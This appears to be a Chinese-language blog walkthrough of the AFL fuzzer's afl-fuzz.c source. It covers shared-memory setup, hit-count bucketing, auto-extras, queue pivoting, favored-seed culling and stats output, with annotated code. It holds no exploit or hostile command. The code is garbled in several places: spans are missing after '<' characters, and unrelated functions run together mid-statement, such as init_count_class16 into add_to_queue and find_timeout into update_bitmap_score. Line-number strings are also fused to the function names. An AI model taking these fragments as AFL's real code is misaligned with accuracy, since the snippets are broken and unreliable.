参数1：程序提供的一个key(非0整数)，命名该共享内存段。这里IPC_PRIVATE表明创建一个新的共享内存段 参数2：指定创建的共享内存的大小为MAP_SIZE 参数3：IPC_CREAT -> 若共享内存不存在，则创建一个共享内存，否则直接打开它； IPC_EXCL -> 只有在共享内存不存在的时候，新的共享内存才能创建，否则将报错 0600 -> Owner==6；Group==0；Other==0 返回值：将新创建的共享内存标识符返回给shm_id */ shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); if (shm_id < 0) PFATAL(\"shmget() failed\"); /* atexit将函数remove_shm注册为在afl-fuzz程序运行结束时要被调用的函数， 该函数执行了\"shmctl(shm_id, IPC_RMID, NULL);\"来删除共享内存。 函数原型：int shmctl(int shmid, int cmd, struct_ds *buf); 参数1：shmid为shmget函数返回的共享内存标识符 参数2：cmd是采取的操作；这里的IPC_RMID表示删除由shmid指定的共享内存段 参数3：buf指向一个shmid_ds结构体，该结构体用于设置共享内存模式和访问权限 返回值：根据cmd指定的操作不同返回值也会不同，在这里返回0表示操作成功，-1表示失败 */ atexit(remove_shm); /* 将shm_str设置为shm_id的值 如果dumb_mode模式，即参数设置了'-n'选项，则将环境变量SHM_ENV_VAR的值设置为shm_str 然后将shm_str给free掉；如果不是dumb_mode模式，就直接free掉 */ shm_str = alloc_printf(\"%d\", shm_id); if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); ck_free(shm_str); /* 调用shmat，用shmid指定的共享内存来设置位图trace_bit，用于跟踪fuzz的执行流程 函数原型：void *shmat(int shmid, const void *shmaddr, int shmflg); 参数1：shmid，参考上面的shmctl 参数2：shmaddr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址 参数3：shmflg，参考上面的shmget 返回值：调用成功时返回一个指向共享内存第一个字节的指针；调用失败返回-1 */ trace_bits = shmat(shm_id, NULL, 0); if (trace_bits == (void *)-1) PFATAL(\"shmat() failed\");} 这里通过”trace_bits”和”virgin_bits”两个位图来分别记录当前的tuple信息及整体tuple信息（tuple在前一篇提到过），其中“trace_bits”位于共享内存上，便于进行进程间通信。”virgin_tmout”和”virgin_crash”两个位图来记录fuzz过程中出现的所有目标程序超时以及崩溃的tuple信息 init_count_class16这部分内容将count_class_lookup8换算成二进制后，就会好理解的多，这里参考了sakura师傅的说法。 c1234567891011121314151617181920212223242526272829303132333435/* 初始化count_class_lookup16数组，用于分支路径的规整 */ /* 先来理解这里的count_class_lookup8，它的结构如下所示，这里将其转换为2进制来看会更清晰， 它的存在是因为trace_bits是用一个字节来记录是否到达这个路径，以及这个路径被命中了多少次， 这个次数在0~255之间，但如果一个循环，它循环5次和循环6次可能是完全一样的效果，为了避免被 当成不同的路径，或者说尽可能减少因为命中次数导致的区别。在每次计算是否发现了新路径之前，先 把这个路径命中数进行规整，比如把命中5次和6次都统一认为是命中了8次，如下所示 */static const u8 count_class_lookup8[256] = { [0] = 0, /* 00000000 */ [1] = 1, /* 00000001 */ [2] = 2, /* 00000010 */ [3] = 4, /* 00000100 */ [4 ... 7] = 8, /* 00001000 */ [8 ... 15] = 16, /* 00010000 */ [16 ... 31] = 32, /* 00100000 */ [32 ... 127] = 64, /* 01000000 */ [128 ... 255] = 128 /* 10000000 */ };/* 而为什么又需要用一个count_class_lookup16呢？是因为AFL中对于一条分支路径的表示是由一个 二元组来表示的。例如路径\"A->B->D->C->B->D\"，就可以用[A,B][B,D][D,C][C,B]四个二元组 表示，这里[B,D]执行了2次，其余执行了1次，这些会被映射到一张哈希表中，这个哈希表在afl-as.h 的分析中提到过，是一个共享内存，在这里，其实就是前面提到的trace_bits。基于这种二元组的表示 的效率考虑，于是在下面初始化了count_class_lookup16 */static u16 count_class_lookup16[65536];EXP_ST void init_count_class16(void) { u32 b1, b2; for (b1 = 0; b1 < 256; b1++) for (b2 = 0; b2 < 256; b2++) count_class_lookup16[(b1 < depth = cur_depth + 1; q->passed_det = passed_det; if (q->depth > max_depth) max_depth = q->depth; if (queue_top) { queue_top->next = q; queue_top = q; } else q_prev100 = queue = queue_top = q; queued_paths++; pending_not_fuzzed++; cycles_wo_finds = 0; /* 每100个元素会设置一个next_100指针，用于更快速的迭代 如果队列中已经有100个testcase对应的q(用testcase的信息初始化的queue_entry)： 1.将q_prev100->next_100设置为新入队的q(例如第101个)，此时q_prev100下标为0，新入队的q下标 为100，这个q_prev100链表串着每100个q里面的第一个q，这么做是为了能够更快的迭代 2.接着将q_prev100也设置为q，即第101个q设置为q_prev100的链表尾 最后将last_path_time设置为当前的系统时间 */ if ((queued_paths - 1) % 100 == 0 && queued_paths > 1) { q_prev100->next_100 = q; q_prev100 = q; } last_path_time = get_cur_time();} load_autoc1234567891011121314151617181920212223242526272829303132333435363738/* 加载自动生成的额外内容 */static void load_auto(void) { u32 i; /* 进入主循环，遍历USE_AUTO_EXTRAS次，默认是50： 1.拼接形成路径fn(in_dir/.state/auto_extras/auto_i) 2.以只读模式打开路径fn指定的文件，将文件描述符返给fd；若打开失败，则抛出异常 3.读取fd指定文件中MAX_AUTO_EXTRA+1个字节的内容(默认是32+1)，这里多读取1个字节来检测token 是否过大: a.如果读取失败，则抛出异常 b.如果读取成功，且读取的字节数在MIN_AUTO_EXTRA(默认为3)和MAX_AUTO_EXTRA(默认为32) 之间，则调用maybe_add_auto */ for (i = 0; i < USE_AUTO_EXTRAS; i++) { u8 tmp[MAX_AUTO_EXTRA + 1]; u8* fn = alloc_printf(\"%s/.state/auto_extras/auto_%06u\", in_dir, i); s32 fd, len; fd = open(fn, O_RDONLY, 0600); if (fd < 0) { if (errno != ENOENT) PFATAL(\"Unable to open '%s'\", fn); ck_free(fn); break; } len = read(fd, tmp, MAX_AUTO_EXTRA + 1); if (len < 0) PFATAL(\"Unable to read from '%s'\", fn); if (len >= MIN_AUTO_EXTRA && len 1; while (i--) if (*((u16*)mem) == interesting_16[i] || *((u16*)mem) == SWAP16(interesting_16[i])) return; } if (len == 4) { i = sizeof(interesting_32) >> 2; while (i--) if (*((u32*)mem) == interesting_32[i] || *((u32*)mem) == SWAP32(interesting_32[i])) return; } /* 第一个循环：从已经读入的token里面找到第一个大小与mem相同的token下标，这么做是因为extras 数组是会经过优化按照大小顺序排列 第二个循环：从已经读入的token里面找到大小与mem相同的token，调用memcmp_nocase进行大小写 不敏感的比较，若发现token与mem完全相同，则直接return，这一步和上面一样，还是 筛选掉已经有的token */ for (i = 0; i < extras_cnt; i++) if (extras[i].len >= len) break; for (; i < extras_cnt && extras[i].len == len; i++) if (!memcmp_nocase(extras[i].data, mem, len)) return; /* 经过上面的校验，mem经过筛选，和interesting_16/32以及extras数组中的元素不同了，这时以同 样的校验手法判断a_extras数组中是否有与mem相同的元素。如果存在相同的元素： 1.令a_extras数组中该元素对应的hit_cnt字段加1，表示该语料被使用的次数增加1次 2.接着跳转到sort_a_extras进行排序处理 */ auto_changed = 1; for (i = 0; i < a_extras_cnt; i++) { if (a_extras[i].len == len && !memcmp_nocase(a_extras[i].data, mem, len)) { a_extras[i].hit_cnt++; goto sort_a_extras; } } /* 如果能走到这一步，说明interesting_8/16/32以及extras数组和a_extras数组中都没有匹配 到这个mem元素，说明这是一个新的条目(entry)，为此，如果仍有空间的话，就把这个entry放到 a_entras里面去；如果没有空间的话，就从a_extras数组的后半部分空间里，随机替换掉一个元素 具体操作如下： 1.如果a_extras_cnt < MAX_AUTO_EXTRAS，即余有空间： a.为a_extras数组增加一个extra_data空间 b.设置新增extra_data.data为mem c.设置新增extra_data.len为len d.a_extra_cnt的值自增 2.如果空间不足： a.从a_extras数组的后半部分空间里随机找到一个位置 b.替换该位置上extra_data.data为mem c.替换该位置上extra_data.len为len d.将该位置上extra_data.hit_cnt的值置0 */ if (a_extras_cnt < MAX_AUTO_EXTRAS) { a_extras = ck_realloc_block(a_extras, (a_extras_cnt + 1) * sizeof(struct extra_data)); a_extras[a_extras_cnt].data = ck_memdup(mem, len); a_extras[a_extras_cnt].len = len; a_extras_cnt++; } else { i = MAX_AUTO_EXTRAS / 2 + UR((MAX_AUTO_EXTRAS + 1) / 2); ck_free(a_extras[i].data); a_extras[i].data = ck_memdup(mem, len); a_extras[i].len = len; a_extras[i].hit_cnt = 0; } /* 函数原型： void qsort(void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *, void *), void *arg); 作用：对数组大小为nmemb，每个元素大小为size，由base指定的数组，按照compar算法进行排序 返回值：无 1.首先对a_extras所有元素按照元素大小进行降序排列(排序用的比较算法这里不展开，源码很简单) 2.然后将a_extras中的前USE_AUTO_EXTRAS个元素按照其语料被使用次数进行降序排列 */sort_a_extras: qsort(a_extras, a_extras_cnt, sizeof(struct extra_data), compare_extras_use_d); qsort(a_extras, MIN(USE_AUTO_EXTRAS, a_extras_cnt), sizeof(struct extra_data), compare_extras_len);} pivot_inputsc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/* 在out_dir/queue中为所有in_dir中的testcase创建硬链接 */static void pivot_inputs(void) { struct queue_entry* q = queue; u32 id = 0; ACTF(\"Creating hard links for all input files...\"); while (q) { /* 将q->fname中最后一个'/'后面的字符串赋给rsl；若没有'/'，就直接把fname赋给rsl */ u8 *nfn, *rsl = strrchr(q->fname, '/'); u32 orig_id; if (!rsl) rsl = q->fname; else rsl++;#ifndef SIMPLE_FILES# define CASE_PREFIX \"id:\"#else# define CASE_PREFIX \"id_\"#endif /* ^!SIMPLE_FILES */ /* 如果原始文件名符合语法，并且文件名记录下的ID匹配上之前指定的ID，那么就使用原始文件名， 这么做对于恢复fuzzing执行很有价值，具体需要满足的操作如下： 1.rsl前3位为'id_'或'id:'(根据是否为SIMPLE_FILES进行判断) 2.将rsl第4位开始的数字读取到orig_id，并且orig_id与id的值相等 如果满足上述条件，则进行一些恢复操作，具体如下： a.设置resuming_fuzz的值为1 b.拼接路径out_dir/queue/rsl，并赋值给nfn c.找到rsl第4位开始，第一个出现':'的位置，如果可以找到，就将':'后面开始的数字读取 到src_id中，如果成功读取了src_id： 1).从fuzzing队列头开始扫描，每扫描一个queue，与此同时src_id的值自减1 2).如果src_id的值归0了，但queue还没到末尾。则通过被扫描的queue深度+1来 设置当前的queue 3).判断max_depth是否发生了变化，并进行适当更新 */ if (!strncmp(rsl, CASE_PREFIX, 3) && sscanf(rsl + 3, \"%06u\", &orig_id) == 1 && orig_id == id) { u8* src_str; u32 src_id; resuming_fuzz = 1; nfn = alloc_printf(\"%s/queue/%s\", out_dir, rsl); src_str = strchr(rsl + 3, ':'); if (src_str && sscanf(src_str + 1, \"%06u\", &src_id) == 1) { struct queue_entry* s = queue; while (src_id-- && s) s = s->next; if (s) q->depth = s->depth + 1; if (max_depth < q->depth) max_depth = q->depth; } } /* 如果不满足上述条件： a.如果不是SIMPLE_FILES: 1).在rsl里搜索'orig:'，若能搜到，则将use_name设置为'orig:'后面的部分；否则 直接将use_name设置为rsl 2).拼接路径out_dir/queue/id:id,orig:use_name，并赋给nfn b.如果是SIMPLE_FILES: 1).拼接路径out_dir/queue/id_id，并赋给nfn */ else {#ifndef SIMPLE_FILES u8* use_name = strstr(rsl, \",orig:\"); if (use_name) use_name += 6; else use_name = rsl; nfn = alloc_printf(\"%s/queue/id:%06u,orig:%s\", out_dir, id, use_name);#else nfn = alloc_printf(\"%s/queue/id_%06u\", out_dir, id);#endif /* ^!SIMPLE_FILES */ } /* 1.调用link_or_copy创建q->fname指定的输入测试用例文件到路径nfn的硬链接，内容也一并复制 2.将q->fname原先指向的路径free掉，重新设置为nfn这个硬链接 3.判断是否设置了passed_det的值，即是否fuzz过，如果fuzz过就调用mark_as_det_done打开 或创建out_dir/queue/.state/deterministic_done/fname这个文件 4.跳转到下一个q，用于外层循环的遍历 5.id自增1 */ link_or_copy(q->fname, nfn); ck_free(q->fname); q->fname = nfn; if (q->passed_det) mark_as_det_done(q); q = q->next; id++; } /* 如果设置了in_place_resume，则调用nuke_resume_dir删除用于本地会话恢复的临时文件夹 */ if (in_place_resume) nuke_resume_dir();} nuke_resume_dirc12345678910111213141516171819202122232425262728293031323334353637383940/* 删除用于本地会话恢复的临时文件夹 */static void nuke_resume_dir(void) { u8* fn; /* 1.删除out_dir/_resume/.state/deterministic_done目录下所有'id_'或'id:'前缀的文件 2.删除out_dir/_resume/.state/auto_extras目录下所有'auto_'前缀的文件 3.删除out_dir/_resume/.state/redundant_edges目录下所有'id_'或'id:'前缀的文件 4.删除out_dir/_resume/.state/variable_behavior目录下所有'id_'或'id:'前缀的文件 5.删除out_dir/_resume/.state/整个文件夹 6.删除out_dir/_resume/目录下所有'id_'或'id:'前缀的文件 */ fn = alloc_printf(\"%s/_resume/.state/deterministic_done\", out_dir); if (delete_files(fn, CASE_PREFIX)) goto dir_cleanup_failed; ck_free(fn); fn = alloc_printf(\"%s/_resume/.state/auto_extras\", out_dir); if (delete_files(fn, \"auto_\")) goto dir_cleanup_failed; ck_free(fn); fn = alloc_printf(\"%s/_resume/.state/redundant_edges\", out_dir); if (delete_files(fn, CASE_PREFIX)) goto dir_cleanup_failed; ck_free(fn); fn = alloc_printf(\"%s/_resume/.state/variable_behavior\", out_dir); if (delete_files(fn, CASE_PREFIX)) goto dir_cleanup_failed; ck_free(fn); fn = alloc_printf(\"%s/_resume/.state\", out_dir); if (rmdir(fn) && errno != ENOENT) goto dir_cleanup_failed; ck_free(fn); fn = alloc_printf(\"%s/_resume\", out_dir); if (delete_files(fn, CASE_PREFIX)) goto dir_cleanup_failed; ck_free(fn); return;dir_cleanup_failed: FATAL(\"_resume directory cleanup failed\");} load_extrasc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107/* Read extras from the extras directory and sort them by size. 从extras目录读取额外的符号，并按照大小将它们排序 */static void load_extras(u8* dir) { /* struct dirent { long d_ino; // 索引节点号 off_t d_off; // 在目录文件中的偏移 unsigned short d_reclen; // 文件名长 unsigned char d_type; // 文件类型 char d_name[NAME_MAX+1]; // 文件名，最长255字节 } */ DIR* d; struct dirent* de; u32 min_len = MAX_DICT_FILE, max_len = 0, dict_level = 0; u8* x; /* 如果dir中包含'@'，那么将'@'后面的字符串转换为数字，并赋值给dict_level */ if ((x = strchr(dir, '@'))) { *x = 0; dict_level = atoi(x + 1); } ACTF(\"Loading extra dictionary from '%s' (level %u)...\", dir, dict_level); /* 打开dir所在目录，如果不能打开且错误类型为ENOTDIR(说明不是一个目录文件)，则调用 load_extras_file从文件中读取额外的符号，读取完毕后，跳转到check_and_sort排序 */ d = opendir(dir); if (!d) { if (errno == ENOTDIR) { load_extras_file(dir, &min_len, &max_len, dict_level); goto check_and_sort; } PFATAL(\"Unable to open '%s'\", dir); } if (x) FATAL(\"Dictionary levels not supported for directories.\"); /* 走到这一步，说明传进来的dir是个目录。这里调用readdir来循环读取dir目录下的文件并进行如下操作： 1.拼接路径dir/d_name，并赋值给dir 2.读取fn路径对应文件的状态到st中，并判断该文件是否可访问 3.根据st_mode(文件保护模式)、st_size(文件总大小)，筛选掉一些无关文件(参考read_testcases) 4.判断st_size是否超过文件大小界限，并根据其大小设置min_len/max_len 5.为extras数组增加一个extra_data的空间，并设置data的空间和len的值(参考maybe_add_auto) 6.打开fn路径指向的文件，从该文件读取内容到extra_data.data 7.关闭文件，free掉路径 8.结束循环，关闭文件夹 */ while ((de = readdir(d))) { struct stat st; u8* fn = alloc_printf(\"%s/%s\", dir, de->d_name); s32 fd; if (lstat(fn, &st) || access(fn, R_OK)) PFATAL(\"Unable to access '%s'\", fn); if (!S_ISREG(st.st_mode) || !st.st_size) { ck_free(fn); continue; } if (st.st_size > MAX_DICT_FILE) FATAL(\"Extra '%s' is too big (%s, limit is %s)\", fn, DMS(st.st_size), DMS(MAX_DICT_FILE)); if (min_len > st.st_size) min_len = st.st_size; if (max_len < st.st_size) max_len = st.st_size; extras = ck_realloc_block(extras, (extras_cnt + 1) * sizeof(struct extra_data)); extras[extras_cnt].data = ck_alloc(st.st_size); extras[extras_cnt].len = st.st_size; fd = open(fn, O_RDONLY); if (fd < 0) PFATAL(\"Unable to open '%s'\", fn); ck_read(fd, extras[extras_cnt].data, st.st_size, fn); close(fd); ck_free(fn); extras_cnt++; } closedir(d); /* 下面这部分的核心就是调用qsort语句，对保存额外符号的extras数组，按照大小进行排序 */check_and_sort: if (!extras_cnt) FATAL(\"No usable files in '%s'\", dir); qsort(extras, extras_cnt, sizeof(struct extra_data), compare_extras_len); OKF(\"Loaded %u extra tokens, size range %s to %s.\", extras_cnt, DMS(min_len), DMS(max_len)); if (max_len > 32) WARNF(\"Some tokens are relatively large (%s) - consider trimming.\", DMS(max_len)); if (extras_cnt > MAX_DET_EXTRAS) WARNF(\"More than %u tokens - will use them probabilistically.\", MAX_DET_EXTRAS);} find_timeoutc12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* 防止当“恢复会话”时，因为没有设置参数'-t'，而导致超时时间的不断调整的情况出现 */static void find_timeout(void) { static u8 tmp[4096]; u8 *fn, *off; s32 fd, i; u32 ret; /* 主体流程： 1.如果没有设置resuming_fuzz，直接return 2.根据是否设置了in_place_resume，采取不同方式的路径拼接，并赋值给fn 3.打开路径fn指定的文件，打开失败就return；打开成功就把文件描述符返回给fd 4.从fd指定的文件中读取4095字节到tmp中；(void)i表示忽略读取是可能的错误；之后关闭文件 5.从tmp中找到第一个出现字符串'exec_timeout :'的位置： a.如果找不到，就直接return b.如果找到了，就将这个位置+20字节偏移后的字符串，转换为整数，并赋值给ret 1).如果ret小于等于4，就直接return 2).否则用ret赋值给exe_tmout 6.设置timeout_given的值为3，给出指定的超时 */ if (!resuming_fuzz) return; if (in_place_resume) fn = alloc_printf(\"%s/fuzzer_stats\", out_dir); else fn = alloc_printf(\"%s/../fuzzer_stats\", in_dir); fd = open(fn, O_RDONLY); ck_free(fn); if (fd < 0) return; i = read(fd, tmp, sizeof(tmp) - 1); (void)i; close(fd); off = strstr(tmp, \"exec_timeout : \"); if (!off) return; ret = atoi(off + 20); if (ret 3大小的空间，然后则将trace_bits经过 minimize_bits压缩后存到trace_mini中 5.设置score_changed的值为1，表明胜者发生了变化 */ if (trace_bits[i]) { if (top_rated[i]) { if (fav_factor > top_rated[i]->exec_us * top_rated[i]->len) continue; if (!--top_rated[i]->tc_ref) { ck_free(top_rated[i]->trace_mini); top_rated[i]->trace_mini = 0; } } top_rated[i] = q; q->tc_ref++; if (!q->trace_mini) { q->trace_mini = ck_alloc(MAP_SIZE >> 3); minimize_bits(q->trace_mini, trace_bits); } score_changed = 1; }} minimize_bits在阅读这部分代码之前，建议先参考一下此文对数据压缩算法的介绍，非常优雅。 c1234567891011121314151617181920/* 场景：仅在update_bitmap_score中被调用，将trace_bits压缩到大小只有其1/8的trace_mini中 作用：将trace_bits数组压缩成更小的位图。由于压缩后仅使用1比特存储路径，因此经过压缩后计数信 息将被删除。当然，这只在发现新路径时才进行调用，并不频繁 算法：1.进入循环，共MAP_SIZE轮 2.*(src++)用来取trace_bits数组中元素的值，取完后自增1，到下一个元素的位置 3.判断*(src++)处是否有值，若有值，则进行如下操作： a.i>>3，即i在trace_mini中的索引号，换句话说，就是在trace_mini中的第几个字节上 b.i&7相当于i%8，只保留低3bits，即trace_mini中的第几个字节上的第几个bit的位置 c.将1左移i%8个比特后，再和以前的数据做|运算，这样，它所在的这个bit 位置就替换成1了 4.若没有值，或已完成上述操作，则进入下轮循环*/static void minimize_bits(u8* dst, u8* src) { u32 i = 0; while (i < MAP_SIZE) { if (*(src++)) dst[i >> 3] |= 1 < (i & favored均设置为0 */ struct queue_entry* q; static u8 temp_v[MAP_SIZE >> 3]; u32 i; if (dumb_mode || !score_changed) return; score_changed = 0; memset(temp_v, 255, MAP_SIZE >> 3); queued_favored = 0; pending_favored = 0; q = queue; while (q) { q->favored = 0; q = q->next; } /* Let's see if anything in the bitmap isn't captured in temp_v. If yes, and if it has a top_rated[] contender, let's use it. 这个迭代的目的就是筛选出一组queue，它们能够覆盖到所有现在已经覆盖到的路径 1.遍历top_rated，判断top_rated[i]对应在temp_v上的bit有没有置位 2.如果top_rated[i]有值，且该path在temp_v中对应的bit被置位 a.就从temp_v中清除掉（也可以理解为标记出，置0后，其它case有着相同路径的情况下，就不会通过 这个if筛选了）所有top_rated[i]覆盖到的path，将对应的bit置为0 b.然后将top_rated[i]->favored置1，计数器queued_favored加1 c.如果top_rated[i]还没有被fuzz过，则令计数器pending_favored加1 */ for (i = 0; i < MAP_SIZE; i++) if (top_rated[i] && (temp_v[i >> 3] & (1 < (i & > 3; while (j--) if (top_rated[i]->trace_mini[j]) temp_v[j] &= ~top_rated[i]->trace_mini[j]; top_rated[i]->favored = 1; queued_favored++; if (!top_rated[i]->was_fuzzed) pending_favored++; } /* 遍历所有的fuzzing queue链表，调用mark_as_redundant筛选掉不是favored的queue， 也就是说，如果不是favored的case，就被标记为redundant_edges */ q = queue; while (q) { mark_as_redundant(q, !q->favored); q = q->next; }} 为了更好的理解该过程，这里选择网上公开的一个例子进行讲解（这部分取自此文） 现假设有如下tuple和seed信息： tuple: t0, t1, t2, t3, t4 seed: s0, s1, s2 初始化temp_v = [1,1,1,1,1] s1可覆盖t2, t3，s2覆盖t0, t1, t4，并且top_rated[0] = s2，top_rated[2]=s1 将按照如下过程进行筛选和判断： 首先判断 temp_v[0]=1，说明t0没有被覆盖； top_rated[0] 存在 (s2) -> 判断s2可以覆盖的范围 -> trace_mini = [1,1,0,0,1]； 更新 temp_v=[0,0,1,1,0]， 标记s2为 “favored”； 继续判断 temp_v[1]=0，说明t1此时已经被覆盖，跳过； 继续判断 temp_v[2]=1，说明t2没有被覆盖； top_rated[2] 存在 (s1) -> 判断s1可以覆盖的范围 -> trace_mini=[0,0,1,1,0]； 更新 temp_v=[0,0,0,0,0]，标记s1为 “favored”； 此时所有tuple都被覆盖，具备”favored’标记的为s1, s2，过程结束。 mark_as_reduntantc12345678910111213141516171819202122232425262728293031323334/* 标记/取消标记是否为冗余(仅针对边)。这么做不是用于恢复状态，但可能对后处理数据集有用 */static void mark_as_redundant(struct queue_entry* q, u8 state) { u8* fn; s32 fd; /* 1.如果state==q->fs_redundant，就直接返回 2.用state(!q->favored)设置q->fs_redundant的值 3.找到q->fname字符串最后一个'/'出现的位置 4.将q->fname最后一个'/'后面的字符串拼接成\"out_dir/queue/.state/redundant_edges/fname\" 并赋值给fn 5.如果state为1，则创建文件out_dir/queue/.state/redundant_edges/fname 6.如果state为0，则删除文件out_dir/queue/.state/redundant_edges/fname */ if (state == q->fs_redundant) return; q->fs_redundant = state; fn = strrchr(q->fname, '/'); fn = alloc_printf(\"%s/queue/.state/redundant_edges/%s\", out_dir, fn + 1); if (state) { fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", fn); close(fd); } else { if (unlink(fn)) PFATAL(\"Unable to remove '%s'\", fn); } ck_free(fn);} show_init_statsc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115/* 在处理输入目录结束时（一些校准的东西也在这里结束了），显示快速统计信息，以及一堆警告 */static void show_init_stats(void) { struct queue_entry* q = queue; u32 min_bits = 0, max_bits = 0; u64 min_us = 0, max_us = 0; u64 avg_us = 0; u32 max_len = 0; /* 这里根据calibrate_case中计算出来的total_cal_us和total_cal_cycles，计算出单轮执行的 时间arv_us */ if (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles; while (q) { if (!min_us || q->exec_us < min_us) min_us = q->exec_us; if (q->exec_us > max_us) max_us = q->exec_us; if (!min_bits || q->bitmap_size < min_bits) min_bits = q->bitmap_size; if (q->bitmap_size > max_bits) max_bits = q->bitmap_size; if (q->len > max_len) max_len = q->len; q = q->next; } SAYF(\"\\n\"); /* 判断avg_us的值，如果大于10000，就抛出警告\"The target binary is pretty slow!\" 1.如果avg_us大于50000，设置havoc_div为10 2.如果avg_us大于20000，设置havoc_div为5 3.如果avg_us大于10000，设置havoc_div为2 */ if (avg_us > (qemu_mode ? 50000 : 10000)) WARNF(cLRD \"The target binary is pretty slow! See %s/perf_tips.txt.\", doc_path); if (avg_us > 50000) havoc_div = 10; /* 0-19 execs/sec */ else if (avg_us > 20000) havoc_div = 5; /* 20-49 execs/sec */ else if (avg_us > 10000) havoc_div = 2; /* 50-100 execs/sec */ /* 如果不是resuming_fuzz下，则根据queue的大小、个数等属性存在的问题，抛出相应的警告。 然后显示一些较为有用的状态信息 */ if (!resuming_fuzz) { if (max_len > 50 * 1024) WARNF(cLRD \"Some test cases are huge (%s) - see %s/perf_tips.txt!\", DMS(max_len), doc_path); else if (max_len > 10 * 1024) WARNF(\"Some test cases are big (%s) - see %s/perf_tips.txt.\", DMS(max_len), doc_path); if (useless_at_start && !in_bitmap) WARNF(cLRD \"Some test cases look useless. Consider using a smaller set.\"); if (queued_paths > 100) WARNF(cLRD \"You probably have far too many input files! Consider trimming down.\"); else if (queued_paths > 20) WARNF(\"You have lots of input files; try starting small.\"); } OKF(\"Here are some useful stats:\\n\\n\" cGRA \" Test case count : \" cRST \"%u favored, %u variable, %u total\\n\" cGRA \" Bitmap range : \" cRST \"%u to %u bits (average: %0.02f bits)\\n\" cGRA \" Exec timing : \" cRST \"%s to %s us (average: %s us)\\n\", queued_favored, queued_variable, queued_paths, min_bits, max_bits, ((double)total_bitmap_size) / (total_bitmap_entries ? total_bitmap_entries : 1), DI(min_us), DI(max_us), DI(avg_us)); /* 找到适当的超时时间。找出适当的超时时间。 基本思想是：平均5倍或最大1倍，四舍五入到EXEC_TM_ROUND 毫秒，并以 1 秒为上限。如果程序很慢，则乘数会降低到2倍或3倍，因为随机调度器抖动不太可能产生任何影响 1.如果timeout_given值为0，即未指定'-t'参数： a.根据avg_us，计算出exec_tmout（avg_us单位是微秒，exec_tmout单位是毫秒，所以要除以1000） b.将计算出的exec_tmout与max_us/1000，取最大值赋给exec_tmout c.然后四舍五入到EXEC_TM_ROUND毫秒 d.再将exec_tmout设置为exec_tmout、EXEC_TIMEOUT中的最大值 e.打印未指定'-t'参数的相关提示信息，设置timeout_given值为1 2.如果timeout_given值为3，代表这是resuming_fuzz，此时的timeout_given是从历史记录里读取的， 并打印相应的提示信息 */ if (!timeout_given) { if (avg_us > 50000) exec_tmout = avg_us * 2 / 1000; else if (avg_us > 10000) exec_tmout = avg_us * 3 / 1000; else exec_tmout = avg_us * 5 / 1000; exec_tmout = MAX(exec_tmout, max_us / 1000); exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND; if (exec_tmout > EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT; ACTF(\"No -t option specified, so I'll use exec timeout of %u ms.\", exec_tmout); timeout_given = 1; } else if (timeout_given == 3) { ACTF(\"Applying timeout settings from resumed session (%u ms).\", exec_tmout); } /* 在dumb_mode下，且未设置环境变量AFL_HANG_TMOUT时。重新运行每个超时测试用例的时间限制 是非常昂贵的，所以让我们选择一个更保守的默认值 */ if (dumb_mode && !getenv(\"AFL_HANG_TMOUT\")) hang_tmout = MIN(EXEC_TIMEOUT, exec_tmout * 2 + 100); OKF(\"All set and ready to roll!\");} find_start_positionc123456789101112131415161718192021222324252627282930313233343536373839404142/* resuming_fuzz时，尝试找到要从其开始的队列位置；只在resuming_fuzz、并且可以找到 原始的fuzzer_stats时才有意义 */static u32 find_start_position(void) { static u8 tmp[4096]; u8 *fn, *off; s32 fd, i; u32 ret; /* 如果不是resuming_fuzz，直接返回 */ if (!resuming_fuzz) return 0; /* 如果设置了in_place_resume，则打开out_dir/fuzzer_stats文件；否则 打开in_dir/../fuzzer_stats文件 */ if (in_place_resume) fn = alloc_printf(\"%s/fuzzer_stats\", out_dir); else fn = alloc_printf(\"%s/../fuzzer_stats\", in_dir); fd = open(fn, O_RDONLY); ck_free(fn); if (fd < 0) return 0; /* 1.将文件的内容读取到tmp中 2.在tmp中找到字符串\"cur_path :\"，并将其对应的值转换为整数，赋给ret 3.判断ret的值是否超过queued_paths，如果超过则将ret置0 4.返回ret */ i = read(fd, tmp, sizeof(tmp) - 1); (void)i; close(fd); off = strstr(tmp, \"cur_path : \"); if (!off) return 0; ret = atoi(off + 20); if (ret >= queued_paths) ret = 0; return ret;} write_stats_file该函数中格式化的状态属性有部分为fuzz_one中计算出的内容，这些内容暂时引用sakura师傅的结论。 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293/* 更新状态文件以对fuzzing过程进行监控 */static void write_stats_file(double bitmap_cvg, double stability, double eps) { static double last_bcvg, last_stab, last_eps; static struct rusage usage; /* 创建out_dir/fuzzer_stats文件，准备写入统计信息 */ u8* fn = alloc_printf(\"%s/fuzzer_stats\", out_dir); s32 fd; FILE* f; fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", fn); ck_free(fn); f = fdopen(fd, \"w\"); if (!f) PFATAL(\"fdopen() failed\"); /* 如果bitmap_cvg、stability、eps都为0，则用last_bcvg、last_stab、last_eps去设置它们 否则（仅在show_stats中被调用时不为空）将它们保存到last_bcvg、last_stab、last_eps中 */ if (!bitmap_cvg && !stability && !eps) { bitmap_cvg = last_bcvg; stability = last_stab; eps = last_eps; } else { last_bcvg = bitmap_cvg; last_stab = stability; last_eps = eps; } fprintf(f, \"start_time : %llu\\n\" // start_time / 1000，fuzz运行的开始时间 \"last_update : %llu\\n\" // get_cur_time() / 1000，当前时间 \"fuzzer_pid : %u\\n\" // 